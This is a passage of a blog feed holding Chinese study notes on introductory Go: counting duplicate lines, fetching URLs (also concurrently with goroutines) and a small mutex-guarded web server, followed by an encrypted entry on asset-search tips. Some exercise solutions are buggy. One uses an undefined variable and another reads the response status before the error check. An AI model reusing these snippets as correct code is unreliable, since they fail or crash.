class=""><p>使用<code>Join</code>函数确实可以大幅减少时间复杂度</p><h4 id="查找重复的行"><a href="#查找重复的行" class="headerlink" title="查找重复的行"></a>查找重复的行</h4><p>对文件做拷贝、打印、搜索、排序、统计或类似事情的程序都有一个差不多的程序结构：一 个处理输入的循环，在每个元素上执行计算处理，在处理的同时或最后产生输出。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 创建一个用于从标准输入读取的扫描器</span><br>input := bufio.NewScanner(os.Stdin)<br><span class="hljs-comment">// 循环读取标准输入的每一行文本</span><br><span class="hljs-keyword">for</span> input.Scan() {<br><span class="hljs-comment">// 将当前行文本作为键，增加其对应的出现次数</span><br>counts[input.Text()]++<br>}<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts {<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> {<br>fmt.Printf(<span class="hljs-string">"%d\t%s\n"</span>, n, line)<br>}<br>}<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-16_15-05-52.png" class=""><p>对上面的代码可以有如下理解：</p><ul><li><p><code>map</code>是存储了键值对的集合，键可以是任意类型，只要其值可以用<code>==</code>运算符比较；值可以是任意类型。上面得的代码中，键是字符串，值是整数。内置函数make创建空函数</p></li><li><p>打印结果使用<code>range</code>函数，在<code>counts</code>上迭代，每次得到键和值。需要注意的是，**<code>map</code>的遍历顺序不确定，该顺序随机，每次运行都会变化**。</p></li><li><p>关于<code>bufio</code>包，这个包使得处理输入和输出方便高效。<code>Scanner</code>类型是该包最有用的特性之 一，它读取输入并将其拆成行或单词；<strong>通常是处理行形式的输入最简单的方法</strong>。 程序使用短变量声明创建<code>bufio.Scanner</code>类型的变量<code>input</code>。读取内容由<code>input.Text()</code>获取，在读到一行时返回<code>true</code>。</p></li><li><p><code>fmt.Printf</code>函数对一些表达式产生格式化输出。该函 数的首个参数是个格式字符串，指定后续参数被如何格式化。和C语言类似。后缀<code>f</code>指<code>fomart</code>，<code>ln</code> 指<code>line</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">%d 十进制整数<br>%x, %o, %b 十六进制，八进制，二进制整数。<br>%f, %g, %e 浮点数： <span class="hljs-number">3.141593</span> <span class="hljs-number">3.141592653589793</span> <span class="hljs-number">3.141593e+00</span><br>%t 布尔：<span class="hljs-literal">true</span>或<span class="hljs-literal">false</span><br>%c 字符（<span class="hljs-type">rune</span>） (Unicode码点)<br>%s 字符串<br>%q 带双引号的字符串<span class="hljs-string">"abc"</span>或带单引号的字符<span class="hljs-string">'c'</span><br>%v 变量的自然形式（natural format）<br>%T 变量的类型<br>%% 字面上的百分号标志（无操作数）<br></code></pre></td></tr></table></figure></li><li><p><code>fmt.Printf</code>相当于C的<code>printf</code>函数，可以格式化参数；而<code>fmt.Println</code>函数相当于C++的<code>cout</code>函数，直接输出字符串</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go">name := <span class="hljs-string">"Alice"</span><br>age := <span class="hljs-number">30</span><br>fmt.Printf(<span class="hljs-string">"Name: %s, Age: %d\n"</span>, name, age)<br>name := <span class="hljs-string">"Bob"</span><br>age := <span class="hljs-number">25</span><br>fmt.Println(<span class="hljs-string">"Name:"</span>, name, <span class="hljs-string">"Age:"</span>, age)<br></code></pre></td></tr></table></figure></li></ul><p>还有另一个方法，一口气把全部输入数据读到内存中，分割为多行，然后处理它们。这个例子引入 了<code>ReadFile</code>函数（来自于<code>io/ioutil</code>包），读取指定文件的全部内容，<code>strings.Split</code>函数把字符串分割成子串的切片。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 创建一个映射(map)，用于存储每行文本及其出现次数</span><br>counts := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">int</span>)<br><span class="hljs-comment">// 循环遍历命令行参数中的每个文件名</span><br><span class="hljs-keyword">for</span> _, filename := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 读取文件的内容</span><br>data, err := ioutil.ReadFile(filename)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果读取文件发生错误，将错误信息输出到标准错误流并继续处理下一个文件</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"xxx:%v\n"</span>, err)<br><span class="hljs-keyword">continue</span><br>}<br><span class="hljs-comment">// 将文件内容按行拆分，并统计每行的出现次数</span><br><span class="hljs-keyword">for</span> _, line := <span class="hljs-keyword">range</span> strings.Split(<span class="hljs-type">string</span>(data), <span class="hljs-string">"\n"</span>) {<br>counts[line]++<br>}<br>}<br><span class="hljs-comment">// 遍历映射(map)，打印出现次数大于1的行及其出现次数</span><br><span class="hljs-keyword">for</span> line, n := <span class="hljs-keyword">range</span> counts {<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">1</span> {<br>fmt.Printf(<span class="hljs-string">"%d\t%s\n"</span>, n, line)<br>}<br>}<br>}<br></code></pre></td></tr></table></figure><p><code>ReadFile</code>函数返回一个字节切片，必须把它转换为<code>string</code>，才能 用<code>strings.Split</code>分割。实现上，<code>bufio.Scanner</code>、<code>ioutil.ReadFile</code>和<code>ioutil.WriteFile</code>都使 用<code>*os.File</code>的<code>Read</code>和<code>Write</code>方法，但是，大多数程序员很少需要直接调用那些低级函数。</p><h4 id="获取URL"><a href="#获取URL" class="headerlink" title="获取URL"></a>获取URL</h4><p>Go语言在<code>net</code>这 个强大<code>package</code>的帮助下提供了一系列的<code>package</code>来做这件事情，使用这些包可以更简单地用 网络收发信息，还可以建立更底层的网络连接，编写服务器程序。</p><p>下面是一个使用示例：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br><span class="hljs-comment">// 循环遍历命令行参数中的每个URL</span><br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-comment">// 使用HTTP GET请求获取URL的响应</span><br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><span class="hljs-comment">// 读取响应体的内容</span><br>b, err := ioutil.ReadAll(resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br><span class="hljs-comment">// 如果在读取过程中发生错误，将错误信息输出到标准错误流并退出程序</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>os.Exit(<span class="hljs-number">1</span>)<br>}<br><span class="hljs-comment">// 将获取到的内容输出到标准输出</span><br>fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>}<br>}<br></code></pre></td></tr></table></figure><p>在文件资源目录下使用终端，命令：<code>go run hello.go http://remixxyh.github.io</code></p><h4 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h4><h5 id="练习1-7"><a href="#练习1-7" class="headerlink" title="练习1.7"></a>练习1.7</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      fmt.Printf(<span class="hljs-string">"%s"</span>, b)<br>   }<br>}<br></code></pre></td></tr></table></figure><p>这里使用<code>io.Copy</code>函数，是题目所给的将内容直接拷贝到标准输出中，将 <code>io.Copy</code> 的返回值存储在一个匿名变量 <code>_</code> 中，因为我们主要关心错误处理，而不是复制的字节数。</p><h5 id="练习1-8"><a href="#练习1-8" class="headerlink" title="练习1.8"></a>练习1.8</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">"http://"</span>) {<br>         url = <span class="hljs-string">"http://"</span> + url<br>      }<br>      resp, err := http.Get(url)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>   }<br>}<br></code></pre></td></tr></table></figure><h5 id="练习1-9"><a href="#练习1-9" class="headerlink" title="练习1.9"></a>练习1.9</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>   <span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>      <span class="hljs-keyword">if</span> !strings.HasPrefix(url, <span class="hljs-string">"http://"</span>) {<br>         url = <span class="hljs-string">"https://"</span> + url<br>      }<br>      resp, err := http.Get(url)<br>      fmt.Printf(resp.Status)<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch:%v\n"</span>, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>      _, err = io.Copy(os.Stdout, resp.Body)<br>      resp.Body.Close()<br>      <span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>         fmt.Fprintf(os.Stderr, <span class="hljs-string">"fetch: reading %s: %v\n"</span>, url, err)<br>         os.Exit(<span class="hljs-number">1</span>)<br>      }<br>   }<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-18_20-21-57.png" class=""><h4 id="并发获取多个URL"><a href="#并发获取多个URL" class="headerlink" title="并发获取多个URL"></a>并发获取多个URL</h4><p>Go语言最有意思并且最新奇的特性就是对并发编程的支持</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>start := time.Now()<br>ch := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">string</span>)<br><span class="hljs-keyword">for</span> _, url := <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br><span class="hljs-keyword">go</span> fetch(url, ch)<br>}<br><span class="hljs-keyword">for</span> <span class="hljs-keyword">range</span> os.Args[<span class="hljs-number">1</span>:] {<br>fmt.Println(&lt;-ch)<br>}<br>fmt.Printf(<span class="hljs-string">"%.2fs elapsed\n"</span>, time.Since(start).Seconds())<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">fetch</span><span class="hljs-params">(url <span class="hljs-type">string</span>, ch <span class="hljs-keyword">chan</span>&lt;- <span class="hljs-type">string</span>)</span></span> {<br>start := time.Now()<br>resp, err := http.Get(url)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>ch &lt;- fmt.Sprint(err)<br><span class="hljs-keyword">return</span><br>}<br>nbytes, err := io.Copy(ioutil.Discard, resp.Body)<br>resp.Body.Close()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> {<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">"while reading %s: %v"</span>, url, err)<br><span class="hljs-keyword">return</span><br>}<br>secs := time.Since(start).Seconds()<br>ch &lt;- fmt.Sprintf(<span class="hljs-string">"%.2fs %7d %s"</span>, secs, nbytes, url)<br>}<br></code></pre></td></tr></table></figure><p>在<code>terminal</code>里执行：<code>go run hello.go https://www.baidu.com http://gopl.io https://remixxyh.github.io</code></p><p>将会得到：</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-08-31_15-53-48.png" class=""><p>我们可以发现整个程序执行的时间由获取请求最长的那个决定</p><p>这是一个并发请求的程序，分析上面的代码：</p><ul><li><code>ch := make(chan string)</code>是一个用于在<code>Goroutine</code>之间传递数据的管道，每当<code>fetch</code>函数执行完毕后，它会将一个带有消息的字符串发送到通道中</li><li><code>Goroutine</code>是一种函数的并发执行方式，<code>main</code>函数本身也运行在一个<code>goroutine</code>中，而<code>go function</code>则表示创建一个新的goroutine，并在这个新的goroutine中执行这个函数</li><li>这个程序里会异步执行<code>Get</code>方法，将<code>Body</code>拷贝到<code>ioutil.Discard</code>（可以把这个变量看成一个垃圾桶）输出流中，<code>io.Copy</code>函数会返回两个值(复制的字节数和可能的错误)，从而实现不处理<code>Body</code>，得到响应体的字节数</li><li><strong>在使用通道发送或者接收数据时，如果此时通道已满或者主函数<code>main</code>没有做好接收的准备（注意：<code>main</code>函数也是一个<code>Goroutine</code>），那么会在发送数据的<code>Goroutine</code>那里阻塞，这个例子中就是<code>fetch</code>函数；如果通道为空或者没有数据可以使用，那么会在接收数据的<code>Goroutine</code>那里阻塞。所以这个例子在<code>main</code>使用一个<code>for</code>循环接收数据，是为了防止主函数执行完了但是<code>fetch</code>还没有执行完</strong>。</li></ul><h4 id="Web服务"><a href="#Web服务" class="headerlink" title="Web服务"></a>Web服务</h4><p>Go语言的内置库使得写一个类似fetch的web服务器变得异常地简单。在本节中，我们会展示 一个微型服务器，这个服务器的功能是返回当前用户正在访问的URL。比如用户访问的是 <a href="http://localhost:8000/hello">http://localhost:8000/hello</a> ，那么响应是URL.Path = “hello”。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>http.HandleFunc(<span class="hljs-string">"/"</span>, handler)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">"localhost:8000"</span>, <span class="hljs-literal">nil</span>))<br>}<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>fmt.Fprintf(w, <span class="hljs-string">"URL.Path = %q\n"</span>, r.URL.Path)<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-09-52.png" class=""><p>在浏览器里访问：</p><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-08-41.png" class=""><p>多个控制器：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> mu sync.Mutex<br><span class="hljs-keyword">var</span> count <span class="hljs-type">int</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> {<br>http.HandleFunc(<span class="hljs-string">"/"</span>, handler)<br>http.HandleFunc(<span class="hljs-string">"/count"</span>, counter)<br>log.Fatal(http.ListenAndServe(<span class="hljs-string">"localhost:8000"</span>, <span class="hljs-literal">nil</span>))<br>}<br><br><span class="hljs-comment">// handler echoes the Path component of the requested URL.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">handler</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>mu.Lock()<br>count++<br>mu.Unlock()<br>fmt.Fprintf(w, <span class="hljs-string">"URL.Path = %q\n"</span>, r.URL.Path)<br>}<br><br><span class="hljs-comment">// counter echoes the number of calls so far.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">counter</span><span class="hljs-params">(w http.ResponseWriter, r *http.Request)</span></span> {<br>mu.Lock()<br>fmt.Fprintf(w, <span class="hljs-string">"Count %d\n"</span>, count)<br>mu.Unlock()<br>}<br></code></pre></td></tr></table></figure><img src="/2023/08/15/GO%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Snipaste_2023-09-01_14-15-13.png" class=""><p>在这些代码的背后，服务器每一 次接收请求处理时都会另起一个<code>goroutine</code>，这样服务器就可以同一时间处理多个请求。在并发情况下，两个请求同一时刻去更新<code>count</code>，那么这个值可能并不会被正确地 增加；这个程序可能会引发一个严重的<code>bug</code>：竞态条件。</p><p><strong>为了避免这个问题，我们必须保证每次修改变量的最多只能有一个<code>goroutine</code>，这也就是代码里的<code>mu.Lock()</code>和 <code>mu.Unlock()</code>调用将修改<code>count</code>的所有行为包在中间的目的。</strong></p><p>第一章的学习就到这里，入门了GO👍👍👍</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>读书笔记</tag>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>搜索测绘资产技巧</title>
    <link href="/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/"/>
    <url>/2023/08/14/%E6%90%9C%E7%B4%A2%E6%B5%8B%E7%BB%98%E8%B5%84%E4%BA%A7%E6%8A%80%E5%B7%A7/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="082b90780c1aba816116f2017b7dd1c1f8c4d0505d41235a56541835acc31043">80f7af2430a3dce6996ee26d1569b23808d1e038bd7854fd46723065ee5637f992e7cd563204426f19034cb40268ff0ef76b35dab70974b3cf60fa315f67fc452d6bdb1a071da5349e708b06385d4bb027b67f5ef85915e9ab689e408e3335900bd2de29fe5220f34991b04ddbcefd7c9cd90f91b82502b6a7601ea61615d3a80f792c353a3b2542466c3fc7e1a0b7c936660401b312165fe5c728774e7e1335100474f7bd3eeac9c7d10a583b77b9bebce3e8d410f067a43d461d542df1defffeba36828c603a825760e6a770b20f0dd62f977701026d954fc3f1078f67ed8e5d62c5db1d90c6162274f8d0641e3d30413f152771c10cd3128c53feb028875289b765012aebcba891e9372039b0e9d672a414239a6ea1c68d8e4740f1d867e18c77086ab71231a5218ee658ce5a1cf9d1d33e57b95d9c9ae5237fd260ea0552ee5b20c801cca1ff12e7376e7f9f021f3820559be98869044b6d3ffd102a4ad34064754c3ce1925fd756c73d8146fde0b81d151b4e073500945efbcaf39d3ea9c74ee0f05414cefc692612d03cab90305f4ebf584acaab78a50fbafc28a6a2a9682f3abbcd5add7d5afbec6a1653a379b2a85483499b95a5e7f9a767d904d47beb152731c4dbe53b8752d30017dd9d948909c0ac95d90fec61699366289b47fa2352bc45c872fd7e27ee9555a222a280ecfab5472eceebd073e887b723b9421d74feefbf4026ac999af5e39b33a32b562e12ea82a31013a9b2214cd75f873bbcc535e7b0de04f8a87a569a51122e188402e78c711d9403c99ceb7b5bad84f91c28eff571036442c47ccc22c2fbac0c14df13432a8dd9ae1f43efa6ed88d363a14a9abab56e966ef2ab434f881041844254c3607345f207fa30de1d46c141beed37fe1396a080b4baaaf9b370ca5b6a64b733a0a5d199a77aa5d719b268d43d6ddf46898f6a91b1bdad9c7d5addfaadabb31c79f03afba1fcc12f34181e52926b789ac91f791b225c9adfe7cd73ea3bca06373795c93f513c3f74c7acb534fd0d0fe6f47a66219b2517386a3679ff5dae73c3a861e26c6692628bfc4223c74772e7a6efff1b2261eff2d555037e7e1659f06a16f6c075a3120268e583e2b9e56def15ada5ab146f8c5bf55b41aea7b0ed41dc9dd621a8ed719cc03bd28269b9d5dbd628aebca48cfc5b3fff2428e7f7570973697b3813cff576632b2d71f4cc4e7f21751f231d7274ba65c513f800439030d9de2be6583b5ca1cb8c5032170a804475f52074cd486d289e6bcb245a934a12355336392e0d1115be3aa8cb59113ca576982a072a2bfebff135fd11071ad86294df943e2887347f6bf90da74cc2b24c73d583959a9854a9c948627fe1c983db3bc4c8f4ea62457da8f3633f2b734e5d477bf9c87b1255385e0634ec57850592829831f59cbb0ff4a5d4f0a32b902c8bced2434474a0898558041eba6881748393f3b172ba4fe3cadccc107d8fb82fe2467f67ee6adc700baef0be13be9cc19e64fd1afa04b1be838120a3b2b4cb82a5a6a9d9606e86a573a0eb67af30a2847bff41db51a2d4c63a471620dfd58eeb64d0a3845be446a986a1ade9d3a04b2f9419fa7d8eba65268bea741c76313efd3a49a15552792726aceb12551d3afd6399e14ce4324c368548101a5983bf10ce66504285734fc1b6a56fdeaf8a251dfffa3277964c43cc6b161cc8dbc02652ee8e6cedd6a99dde68baaef0a5546c9c75f4d8fda2252238f0a11377c52143b25b0a5c0acdfea321cb0e1f1d2b96c464d1d8161a2b22638aa3e2b0c4729f92d51454e2d6876bf429a92ab330928ae2b9053fb63226d7ee9072d54bd05b0630905803237e32a89fc5111b4f47acc78976e640854776b434457dd5e52d3ee392d0339e9bf951fa0146947a5d4fcf7bb416c0633407949d3acbd939e8f67452039b588b1ed4ed051fd14dc361551e0b1ea087630ff711fa8f77650c45da871bd9a1b613eb4963a59fa0c51cc3f6d8828f5b49f2e789f293c2ff77516621f0016621373743439e8638e0a08e0e4d87752e7aa065de8b3b7114f01d5c724503b4bb64bc5cd1ab7c2c3bef9f96a8da9030c82e4ba3fd54112ed4473f982e6b80ad5bdeeb208bffb823e278820579983e1d289bcc5a85cb504c72a57c3a3ce39938967726774a0cd50c9aeeac6b19f74d3cceec913daaec60bb4a5b8b34592ba7c38e5185498df89a1f4f420072e3ab22c96d32eb5bcfb51a14ca48a99c7e4617ed8f8cf3a8ea59fc062a9c189e4065726977c349863b34d5f6b49093549f49c42a6682420aca74ba038f34a46a1dc2f859336a31d175392902588f804729330005841e36edda056e68bdf53a9a17201137b55452369cd6b33228fe9fc35ad614673aa0ea72ec889f028be0b773df7b44cd5bf7c3478103369bd46ea584271bf4a3e306f23439b9363fa62ecc02bfece1478494cfbc40ccfb1822b646df2e1c83fa8a8df372420f5c4a0cbac3289582300155c2e06286f5246c46c7386510420d251b54c35e5fc63e3674a59c25fea94190a4f23863da53436a01370c81579e8676eea5f3b5a6b55545f3148eaa2dc8ff7d417fcfa29792e48f133888c4000007d6630f114c40b578d676d06c6ab65c87d89690ffdbdb2678fe55e8b9d934dc7b992a653d17182abf582e5ad78ed381d08b6ddbe39aed091f571fc8966421c9acfe7f51f0c53803c63ae776ec26b113ba59282894efa3a1b4aaa0a7c51e34b265a5746a048d4d459d13e365aedd2eead4e70c370b8f31d000903e43408279d57445ddea8786aeb245e7f013870372168e6ab45adab862c25a7e985659d08339ccc44469bbd0e410fb91183f5ff06b1c274b9eed2eb89a5c3aaddfc96a8609c995519a47ace2669bb71a482964f5dfb40d3c51e2ef8134ff55a828b4755716eb3f284e6b3200a4c522f8e0537c4234d35c611bef7f2c9f0dbdcad9fedd7b5fbb7b76fb6f14be99634eeddd7bec7ad09ca888d6321fb38401eeafbb09a8c3a807947a7f84939b8e23fb03da716a9db0dc316a7364568bf620564e3fda7306e8faad7ae2b68a719c976834cb8d7c247ab95b4b82aa0b5c438bf26d88cdf7a6eed7b9af3579b1d5a91b743123df9bfb257699d7ba2ae2a2b380078bbb39f942164a5138f0ac4a334d49431b1d0981aa01cdaa9e8e2286c41ac